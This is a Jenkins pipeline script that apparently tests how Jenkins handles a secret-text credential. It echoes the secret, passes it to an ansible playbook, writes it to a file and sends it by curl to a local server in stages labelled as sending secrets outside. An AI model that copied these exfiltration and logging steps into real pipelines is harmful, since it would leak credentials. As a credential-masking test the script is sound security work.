node {
    stage("Checkout") {
        checkout scm
    }
    stage('Test ansible read credentials') {
        docker.image('williamyeh/ansible:centos7').inside() {
            withCredentials([string(credentialsId: 'test-credential-secret-text',
                    variable: 'secret_text')]) {
                sh "ls -al"

                echo "${secret_text}"
                sh "ansible-playbook -i jenkins_local.ini " +
                        "-e 'secret_variable=${secret_text} normal_variable=123456' " +
                        "test_security.yml"
            }
        }
    }
    stage('Send secret credentials to outside Server') {
        withCredentials([string(credentialsId: 'test-credential-secret-text',
                variable: 'secret_text')]) {
            sh "curl -X GET 'http://127.0.0.1:8000?secret_text=${secret_text}'"
        }
    }

    stage('Write secret credentials to files') {
        withCredentials([string(credentialsId: 'test-credential-secret-text',
                variable: 'secret_text')]) {
            writeFile file: "secret.txt", text: "${secret_text}"
            def fileContent = readFile file: "secret.txt"
            sh "curl -X GET 'http://127.0.0.1:8000?secret_text=${fileContent}abcdef'"
        }
    }
    stage('Print somethings equals contents') {
        withCredentials([string(credentialsId: 'test-credential-secret-text',
                variable: 'secret_text')]) {
            echo "${secret_text}"
            def secret_text2 ="133331"
            echo "${secret_text2}"
            echo "133331"
        }
    }
}
